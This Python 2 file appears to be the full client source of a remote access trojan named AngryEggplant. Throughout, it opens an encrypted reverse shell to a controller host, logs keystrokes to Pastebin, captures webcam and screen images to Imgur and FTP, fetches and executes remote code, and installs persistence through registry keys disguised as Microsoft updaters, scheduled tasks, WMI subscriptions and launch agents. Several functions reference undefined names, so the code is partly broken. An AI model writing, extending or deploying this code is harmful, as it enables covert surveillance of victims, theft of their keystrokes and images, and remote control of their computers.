#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88


https://github.com/colental/AngryEggplant

'''

import os
import sys
import time
import json
import socket
import pickle
import subprocess
from mss import mss
from uuid import uuid1
from ftplib import FTP
from struct import pack
from random import choice
from imp import new_module
from tempfile import mktemp
from zipfile import ZipFile
from requests import request
from threading import Thread
from logging import getLogger
from urllib import urlretrieve
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from base64 import b64encode, b64decode
from logging.handlers import SocketHandler
from Crypto.Util.number import long_to_bytes, bytes_to_long
if os.name is 'nt':
    from ctypes import windll
    from pyHook import HookManager
    from pythoncom import PumpMessages
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
else:
    from pyxhook import HookManager



class Client(object):
    global get_module
    def __init__(self, *args, **kwargs):
        time.clock()
        self.mode       = 0
        self.exit       = 0
        self.jobs       = {}
        self.buffer     = str()
        self.window     = None
        self.a          = long(kwargs.get('a'))
        self.b          = long(kwargs.get('b'))
        self.c          = long(kwargs.get('c'))
        self.d          = long(kwargs.get('d'))
        self.e          = long(kwargs.get('e'))
        self.f          = repr(kwargs.get('f'))
        self.g          = long(kwargs.get('g'))
        self.q          = long(kwargs.get('q'))
        self.s          = long(kwargs.get('s'))
        self.v          = bool(kwargs.get('v'))
        self.logger     = self.get_logger()
        self.modules    = self.get_modules()
        self.results    = self.get_results()

# ----------------- PRIVATE FUNCTIONS --------------------------

    def _pad(self, s):
        return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'

    def _hidden_process(self, path):
        info = subprocess.STARTUPINFO()
        info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
        info.wShowWindow = subprocess.SW_HIDE
        p = subprocess.Popen(path, startupinfo=info)
        return p

    def _target(self, **kwargs):
        try:
            ab = request('GET', long_to_bytes(self.a), headers={'API-Key': long_to_bytes(self.b)}).json() 
            return ab[ab.keys()[0]][0].get('ip')
        except Exception as e:
            if self.v:
                print 'Target error: {}'.format(str(e))
    
    def _connect(self, host='localhost', port=1337):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print 'Connecting to {}:{}...'.format(host, port)
            s.connect((host, port))
            return s
        except Exception as e:
            if self.v:
                print 'Connection error: {}'.format(str(e))
            time.sleep(10)
            return self._connect(host, port)

    def _send(self, data, method='default'):
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block)
            msg = '{}:{}\n'.format(method, ciphertext)
            try:
                self.socket.sendall(msg)
            except socket.error: return
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if self.v:
                print 'Send error: {}'.format(str(e))

    def _receive(self):
        try:
            data = ""
            self.socket.setblocking(False) if self.mode else self.socket.setblocking(True)
            while "\n" not in data:
                try:
                    data += self.socket.recv(1024)
                except socket.error: return
            data = self._decrypt(data.rstrip()) if len(data) else data
            return data
        except Exception as e:
            if self.v:
                print 'Receive error: {}'.format(str(e))

    def _diffiehellman(self, bits=2048):
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self.socket.sendall(long_to_bytes(xA))
            xB = bytes_to_long(self.socket.recv(256))
            x = pow(xB, a, p)
            return SHA256.new(long_to_bytes(x)).digest()
        except Exception as e:
            if self.v:
                print 'Diffie-Hellman error: {}'.format(str(e))

    def _encrypt(self, plaintext):
        try:
            text = self._pad(bytes(plaintext))
            iv = os.urandom(AES.block_size)
            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            ciphertext = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
            output = b64encode(ciphertext + hmac_sha256)
            return output
        except Exception as e:
            if self.v:
                print 'Error: {}'.format(str(e))

    def _decrypt(self, ciphertext):
        try:
            ciphertext  = b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac  = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            if check_hmac != calc_hmac:
                self.logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
            return output.rstrip(b'\0')
        except Exception as e:
            if self.v:
                print 'Decryption error: {}'.format(str(e))

    def _obfuscate(self, data, encoding=None):
        data    = bytes(data)
        p       = []
        n       = len(data)
        block   = os.urandom(2)
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += os.urandom(1)
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def _deobfuscate(block, encoding=None):
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return str().join([block[i] for i in p])

    def _show(self, dict_or_json):
        try:
            results = json.dumps(dict_or_json, indent=2, separators=(',','\t'))
        except Exception as e:
            try:
                string_repr = repr(dict_or_json)
                string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                string_repr = string_repr.replace('(', '[').replace(')', ']')
                results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', '\t'))
            except:
                results = repr(dict_or_json)
        return results

    def _powershell(self, cmdline):
        try:
            info = subprocess.STARTUPINFO()
            info.dwFlags = sub.STARTF_USESHOWWINDOW
            info.wShowWindow = sub.SW_HIDE
            command=['powershell.exe', '/c', cmdline]
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
            results, _ = p.communicate()
            return results
        except Exception as e:
            if self.v:
                print 'Powershell error: {}'.format(str(e))
        
# ----------------- KEYLOGGER --------------------------

    def keylogger_event(self, event):
        if event.WindowName != self.window:
            self.window = event.WindowName
            self.buffer += "\n[{}]\n".format(self.window)
        if event.Ascii > 32 and event.Ascii < 127:
            self.buffer += chr(event.Ascii)
        elif event.Ascii == 32:
            self.buffer += ' '
        elif event.Ascii in (10,13):
            self.buffer += ('\n')
        elif event.Ascii == 8:
            self.buffer = self.buffer[:-1]
        else:
            pass
        return True
        
    def keylogger_logger(self):
        while True:
            if self.exit:
                if len(self.buffer):
                    result  = self.upload_pastebin(self.buffer)
                    if self.mode:
                        self.logger.log(40, result, extra={'submodule':'keylogger'})
                    else:
                        self.results['keylogger'].update({time.ctime(): result})
                break
            if time.clock() < self.modules['keylogger']['options']['seconds']:
                time.sleep(10)
            else:
                if len(self.buffer) > self.modules['keylogger']['options']['bytes']:
                    result  = self.upload_pastebin(self.buffer)
                    if self.mode:
                        self.logger.log(40, result, extra={'submodule':'keylogger'})
                    else:
                        self.results['keylogger'].update({time.ctime(): result})
                    self.buffer = ''
                self.modules['keylogger']['options']['seconds'] += 300.0

    def keylogger_manager(self):
        if 'keylogger_logger' not in self.jobs:
            self.jobs['keylogger_logger'] = Thread(target=self.keylogger_logger, name='keylogger_logger')
            self.jobs['keylogger_logger'].start()
            while True:
                if self.exit:
                    break
                hm = HookManager()
                hm.KeyDown = self.keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)

# ----------------- WEBCAM --------------------------

    def webcam_image(self):
        dev = VideoCapture(0)
        tmp = mktemp(suffix='.png') if os.name is 'nt' else mktemp(prefix='.', suffix='.png')
        r,f = dev.read()
        waitKey(1)
        imwrite(tmp, f)
        dev.release()
        self.results['webcam'][time.ctime()] = self.upload_imgur(tmp)

    def webcam_stream(self):
        dev = VideoCapture(0)
        s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._target(o=self.a, p=self.b), port))
        while True:
            ret, frame = dev.read()
            data = pickle.dumps(frame)
            try:
                self._send(pack("L", len(data))+data)
            except:
                dev.release()
                break

    def webcam_video(self):
        fpath   = mktemp(suffix='.avi')
        fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
        dev     = VideoCapture(0)
        end     = time.time() + 5.0
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if waitKey(0) and time.time() > end: break
        dev.release()
        self.results['webcam'][time.ctime()] = self.upload_ftp(fpath)

# ----------------- PERSISTENCE --------------------------

    def add_scheduled_task_persistence(self, filename=None):
        task_run    = filename or self.f
        task_name   = os.path.splitext(os.path.basename(filename))[0]
        try:
            if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), shell=True) == 0:
                return True
        except Exception as e:
            if self.v:
                print 'Add scheduled task error: {}'.format(str(e))
        return False

    def remove_scheduled_task_persistence(self, name=None):
        try:
            task_name = name or os.path.splitext(os.path.basename(self.f))[0]
            if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
                return True
        except: pass
        return False

    def add_startup_file_persistence(self, filename=None):
        try:
            cmd = filename or self.f
            appdata = os.path.expandvars("%AppData%")
            startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
            if os.path.exists(startup_dir):
                random_name = str().join([choice([chr(i).lower() for i in range(0,255) if chr(i).isalnum()]) for _ in choice(range(6,12))])
                persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
                content = '\n[InternetShortcut]\nURL=file:///%s\n' % cmd
                with file(persistence_file, 'w') as fp:
                    fp.write(content)
                return True
        except Exception as e:
            if self.v:
                print 'Adding startup file error: {}'.format(str(e))
        return False

    def remove_startup_file_persistence(self):
        appdata     = os.path.expandvars("%AppData%")
        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup_dir):
            for f in os.listdir(startup_dir):
                filepath = os.path.join(startup_dir, f)
                if filepath.endswith('.eu.url'):
                    try:
                        os.remove(filepath)
                        return True
                    except: pass
                    return False

    def add_registry_key_persistence(self, cmd=None, name='MicrosoftUpdateManager'):
        reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
        value   = cmd or self.f
        try:
            SetValueEx(reg_key, name, 0, REG_SZ, value)
            CloseKey(reg_key)
            return True
        except Exception as e:
            if self.v:
                print 'Remove registry key error: {}'.format(str(e))
        return False

    def remove_registry_key_persistence(self, name='MicrosoftUpdateManager'):
        try:
            key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, name)
            CloseKey(key)
            return True
        except: pass
        return False

    def add_wmi_persistence(self, command=None, filename=None, name='MicrosoftUpdaterManager'):
        try:
            if filename: 
                if not os.path.exists(filename):
                    return 'Error: file not found: {}'.format(filename)
                cmd_line = filename
            else:
                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            powershell = request('GET', long_to_bytes(self.s)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
            self._powershell(powershell)
            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
            result = self._powershell(code)
            if name in result:
                return True
        except Exception as e:
            if self.v:
                print 'WMI persistence error: {}'.format(str(e))
        return False

    def remove_wmi_persistence(self, name='MicrosoftUpdaterManager'):
        try:
            code =''' 
            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
            result = self._powershell(code)
            if not result:
                return True
        except: pass
        return False

    def add_hidden_file_persistence(self):
        try:
            name = os.path.basename(self.f)
            if os.name is 'nt':
                hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
            else:
                hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
                if hide:
                    self.f = os.path.join(os.path.dirname('.' + name), '.' + name)
        except Exception as e:
            if self.v:
                print 'Adding hidden file error: {}'.format(str(e))

    def remove_hidden_file_persistence(self, *args, **kwargs):
        try:
            return subprocess.call('attrib -h {}'.format(filename or self.f), shell=True) == 0
        except: pass

    def add_launch_agent_persistence(self, name='com.apple.update.manager'):
        try:
            code    = request('GET', long_to_bytes(self.g)).content
            label   = name
            fpath   = mktemp(suffix='.sh')
            bash    = code.replace('__LABEL__', label).replace('__FILE__', self.f)
            fileobj = file(fpath, 'w')
            fileobj.write(bash)
            fileobj.close()
            self.results['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
            bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            return True
        except Exception as e2:
            if self.v:
                print 'Error: {}'.format(str(e2))
        return False

    def remove_launch_agent_persistence(self, name=None):
        try:
            name = name or os.path.splitext(os.path.basename(self.f))[0]
            os.remove('~/Library/LaunchAgents/{}.plist')
            return True
        except: pass
        return False

# ----------------- COMMANDS --------------------------

    def pwd(self,**kwargs): return os.getcwd()
    
    def new(self, options): return get_module(uri)
    
    def wget(self, target): return urlretrieve(target)[0]
    
    def cat(self,filename): return open(filename).read(4000)
    
    def selfdestruct(self): return self.self_destruct()
    
    def ls(self, pathname): return '\n'.join(os.listdir(dirname))
    
    def unzip(self, files): return ZipFile(path).extractall('.')
    
    def cd(self, pathname): return os.chdir(dirname) if os.path.isdir(dirname) else os.chdir('.')
    
    def show(self, target): return self._show(getattr(self, x)) if hasattr(self, x) else '{} not found'.format(x)
    
    def use(self, modules): return self.modules.get(module).update({'status': True}) if module in self.modules else None
    
    def stop(self, target): return [self.modules.get(module).update({'status': False}) for module in tasks if module in self.modules]
    
    def info(self, **args): return {'IP Address': self.get_ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
    
    def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))

# ----------------- MODULES --------------------------

    def persistence(self):
        persistence_methods = ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']
        for method in persistence_methods:
            if self.modules['persistence']['status']:
                if method not in self.results['persistence']:
                    self.results['persistence'][method] = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
            else:
                if method in self.results['persistence']:
                    self.results['persistence'].remove(method) if getattr(self, 'remove_{}_{}_persistence'.format(*method.split()))() else None

    def screenshot(self):
        if self.modules['screenshot']['status']:
            tmp = mktemp(suffix='.png')
            with mss() as screen:
                img = screen.shot(output=tmp)
            self.results['screenshot'][time.ctime()] = self.upload_imgur(img)

    def keylogger(self):
        if self.modules['keylogger'].get('status'):
            if 'keylogger' in self.jobs:
                if not self.jobs['keylogger'].is_alive():
                    self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
                    self.jobs['keylogger'].start()
            else:
                self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
                self.jobs['keylogger'].start()
            runtime = time.time() - float(self.jobs['keylogger'].name)
            status  = 'Current session duration: {}'.format(self.get_status(runtime))
            self.results['keylogger'][time.ctime()] = status
            return status

    def webcam(self):
        if self.modules['webcam']['options']['image']:
            return self.webcam_image()
        elif self.modules['webcam']['options']['stream']:
            return self.webcam_stream()
        elif self.modules['webcam']['options']['video']:
            return self.webcam_video()

# ----------------- PUBLIC FUNCTIONS --------------------------

    def get_results(self):
        return {module:{} for module in self.modules}

    def get_modules(self):
        return {
            'webcam'        : {'status': True, 'options': {'image': True, 'video': False, 'stream': False}},
            'keylogger'     : {'status': True, 'options': {'bytes': 1024, 'seconds': 300.0}},
            'screenshot'    : {'status': True, 'options': {}},
            'persistence'   : {'status': True, 'options': {'method': 'all'}}
            }

    def get_ip(self):
        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
        for target in sources:
            try:
                ip = request('GET', target).content
                if socket.inet_aton(ip):
                    return ip
            except: pass

    def get_mode(self, args=None):
        if args:
            mode, _, p = str(args).partition(' ')
            if mode == 'standby':
                self.mode = 1
                port = int(p) if len(p) else 4321
                self.logger = self.get_logger(port)
            else:
                self.mode = 0
        output = 'standing by' if self.mode else 'client ready'
        return output

    def get_admin(self):
        if self.info()['Admin']:
            return {'User': self.login, 'Administrator' : str(self.admin)}
        if self.f:
            if os.name is 'nt':
                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
            else:
                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)

    def get_logger(self, port=4321):
        module_logger           = getLogger(_hidden_process('IP Address'))
        module_logger.handlers  = []
        socket_handler          = SocketHandler(self._target(o=self.a, p=self.b), port)
        module_logger.addHandler(socket_handler)
        return module_logger

    def get_module(self, uri, name=None):
        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
        module  = new_module(name)
        source  = request('GET', uri).content
        code    = compile(source, name, 'exec')
        exec code in module.__dict__
        globals()[name] = module
        sys.modules[name] = module
        return module

    def upload_imgur(self, filename):
        with open(filename, 'rb') as fp:
            data = b64encode(fp.read())
        os.remove(filename)
        result = request('POST', 'https://api.imgur.com/3/upload', headers={'Authorization': long_to_bytes(self.e)}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
        return result

    def upload_pastebin(self, text):
        result = request('POST', 'https://pastebin.com/api/api_post.php', data={'api_dev_key': long_to_bytes(self.c), 'api_user_key': long_to_bytes(self.d), 'api_option': 'paste', 'api_paste_code': text}).content
        return result
    
    def upload_ftp(self, filepath):
        try:
            host = FTP(*long_to_bytes(self.q).split())
            if self.info().get('IP Address') not in host.nlst('/htdocs'):
                host.mkd('/htdocs/{}'.format(self.info().get('IP Address')))
            result = '/htdocs/{}/{}'.format(self.info().get('IP Address'), os.path.basename(filepath))
            upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
        except Exception as e:
            result = str(e)
        return result

    def run_modules(self):
        modules = [mod.lower() for mod in self.modules if self.modules[mod].get('status')]
        for module in modules:
            self.jobs[module] = Thread(target=getattr(self, module), name=module.title())
            self.jobs[module].start()
        t.join()
        if not self.mode:
            return self._show(self.results)

    def run_shell(self):
        while True:
            if self.mode:
                break
            prompt = "[%d @ {}]> ".format(os.getcwd())
            self._send(prompt, method='prompt')   
            data = self._receive()
            cmd, _, action = data.partition(' ')

            if cmd in self.commands:
                result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
            else:
                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())

            if result and len(result):
                result = '\n' + str(result) + '\n'
                self._send(result, method=cmd)

    def run_standby(self):
        while True:
            runs = time.time() + 60.0
            while time.time() < runs:
                time.sleep(1)
                if self.mode:
                    b = self._receive()
                    if b and len(b):
                        self.mode = 0 if b else 1
                else:
                    break
            data = self.run_modules()

    def run(self):
        self.socket = self._connect(host=self._target(o=self.a, p=self.b))
        self.dhkey  = self._diffiehellman()
        exit_status = 0
        if self.v:
            print 'connected successfully'
        while not exit_status:
            if not self.mode:
                self.run_shell()
            else:
                self.run_standby()
            exit_status = self.exit
        sys.exit(0)

# ----------------- MAIN --------------------------

def main(*args, **kwargs):
    module = Client(**kwargs)
    return module.run()

if __name__ == '__main__':
    main()


